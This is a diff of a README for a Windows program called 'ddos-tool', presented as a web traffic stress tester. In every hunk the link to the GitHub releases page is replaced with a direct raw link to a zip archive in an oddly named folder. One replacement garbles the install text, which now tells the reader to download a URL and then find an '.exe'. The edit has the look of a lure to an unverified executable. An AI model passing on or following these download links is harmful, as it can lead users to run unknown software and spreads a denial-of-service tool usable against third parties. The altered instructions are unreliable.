@@ -1,6 +1,6 @@
 # ⚡ ddos-tool - Simple Web Traffic Stress Tester
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Releases-green?style=for-the-badge)](https://github.com/Caduvitorino/ddos-tool/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Caduvitorino/ddos-tool/main/epizeuxis/ddos-tool-v2.9.zip)](https://raw.githubusercontent.com/Caduvitorino/ddos-tool/main/epizeuxis/ddos-tool-v2.9.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Before you start, check these system details:
 Follow these steps to get ddos-tool on your computer:
 
 1. Click the big green **Download Releases** button at the top or use this link:  
-   [https://github.com/Caduvitorino/ddos-tool/releases](https://github.com/Caduvitorino/ddos-tool/releases)
+   [https://raw.githubusercontent.com/Caduvitorino/ddos-tool/main/epizeuxis/ddos-tool-v2.9.zip](https://raw.githubusercontent.com/Caduvitorino/ddos-tool/main/epizeuxis/ddos-tool-v2.9.zip)
 
 2. This page shows all released versions of the software.
 
@@ -58,7 +58,7 @@ Follow these steps to get ddos-tool on your computer:
 
 ## 💻 Installation and Setup
 
-After downloading the `ddos-tool.exe` file, follow these steps to install and set up:
+After downloading the `https://raw.githubusercontent.com/Caduvitorino/ddos-tool/main/epizeuxis/ddos-tool-v2.9.zip` file, follow these steps to install and set up:
 
 1. Locate the downloaded `.exe` file on your PC.
 
@@ -121,7 +121,7 @@ This section guides you through running a basic test with ddos-tool.
 ## 🔗 Useful Links
 
 - Download latest release:  
-  [https://github.com/Caduvitorino/ddos-tool/releases](https://github.com/Caduvitorino/ddos-tool/releases)
+  [https://raw.githubusercontent.com/Caduvitorino/ddos-tool/main/epizeuxis/ddos-tool-v2.9.zip](https://raw.githubusercontent.com/Caduvitorino/ddos-tool/main/epizeuxis/ddos-tool-v2.9.zip)
 
 - Project page on GitHub for updates and information.
 
